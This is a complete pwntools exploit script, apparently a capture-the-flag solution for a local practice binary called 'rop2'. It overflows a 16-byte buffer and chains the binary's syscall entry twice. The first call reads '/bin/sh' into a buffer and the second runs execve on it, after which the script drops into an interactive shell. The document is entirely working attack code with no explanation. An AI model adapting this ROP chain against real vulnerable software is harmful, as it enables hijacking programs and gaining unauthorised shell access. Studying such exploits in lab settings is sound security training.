from pwn import *
offset = 'A' * 16
elf = ELF('./rop2')
p = process('./rop2')
syscall = p32(elf.plt['syscall'])
ret_addr = p32(elf.symbols['overflow'])
sys_read = p32(0x3) + p32(0x0) + p32(elf.symbols['some_buffer']) + p32(0x7) # syscall(3, fd, buf, count)
sys_execve = p32(0x0b) + p32(elf.symbols['some_buffer']) + p32(0x0) + p32(0x0)
#paylaod = padding + func + ret + args
payload = offset + syscall + ret_addr + sys_read
p.sendline(payload)
p.send('/bin/sh')
payload = offset + syscall + p32(0xdeadbeaf) + sys_execve
p.sendline(payload)
p.interactive()
